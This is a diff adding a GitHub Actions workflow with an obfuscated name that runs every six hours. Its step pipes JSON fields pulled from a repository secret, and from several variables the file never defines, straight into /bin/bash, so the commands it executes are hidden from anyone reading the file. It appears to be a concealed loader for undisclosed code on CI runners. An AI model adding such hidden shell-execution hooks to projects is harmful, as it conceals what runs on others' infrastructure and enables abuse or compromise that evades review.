@@ -1,0 +1,22 @@
+name: xiamianduibuduii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiamianduibuduii
+        env:
+          z9: ${{ secrets.z9 }}
+        run: |
+          echo $z9 | jq -r .tu044 | /bin/bash
+          echo $qwx56556 | jq -r .xczn320 | /bin/bash
+          echo $uud1137 | jq -r .uumoy29350 | /bin/bash
+          echo $tzt5 | jq -r .v2843 | /bin/bash
+          echo $abug4985 | jq -r .gkp3391 | /bin/bash
+          echo $jet3 | jq -r .amz3972 | /bin/bash
+
